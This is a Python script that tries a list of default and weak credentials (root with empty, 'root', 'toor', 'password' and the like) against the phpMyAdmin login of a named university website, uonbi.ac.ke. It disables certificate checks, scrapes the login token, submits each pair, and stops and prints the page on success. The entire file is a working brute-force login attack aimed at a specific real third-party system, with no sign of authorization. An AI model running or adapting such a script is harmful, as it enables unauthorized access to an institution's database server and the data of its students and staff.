"""Try a small credential set against uonbi phpMyAdmin."""
import http.cookiejar
import re
import ssl
import sys
import urllib.parse
import urllib.request

sys.path.insert(0, ".")
import scan  # noqa: E402

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

URL = "https://uonbi.ac.ke/phpmyadmin/"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

CREDS = [("root", ""), ("root", "root"), ("root", "password"), ("root", "toor"),
         ("uonbi", "uonbi"), ("admin", "admin"), ("root", "mysql"),
         ("root", "P@ssw0rd"), ("mysql", "mysql")]


def op():
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()),
        urllib.request.HTTPSHandler(context=CTX))


def get(o, url, data=None):
    req = urllib.request.Request(url, data=data, headers={"User-Agent": scan.UA})
    try:
        with o.open(req, timeout=15) as r:
            return r.status, r.read(50000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(20000).decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)


for u, p in CREDS:
    o = op()
    st, page = get(o, URL)
    m = re.search(r'name="token" value="([^"]+)"', page)
    if not m:
        print(f"{u}:{p} -> no token (status {st})")
        continue
    data = urllib.parse.urlencode({
        "pma_username": u, "pma_password": p, "server": "1",
        "target": "index.php", "token": m.group(1), "set_session": "1"}).encode()
    st2, after = get(o, URL + "index.php", data)
    ok = ("Database server" in after or "Server:" in after
          or "logout" in after.lower()) and "pma_username" not in after
    print(f"{u}:{p} -> {st2} len={len(after)} {'SUCCESS' if ok else 'fail'}")
    if ok:
        print("   ", re.sub(r"\s+", " ", after)[:200])
        break
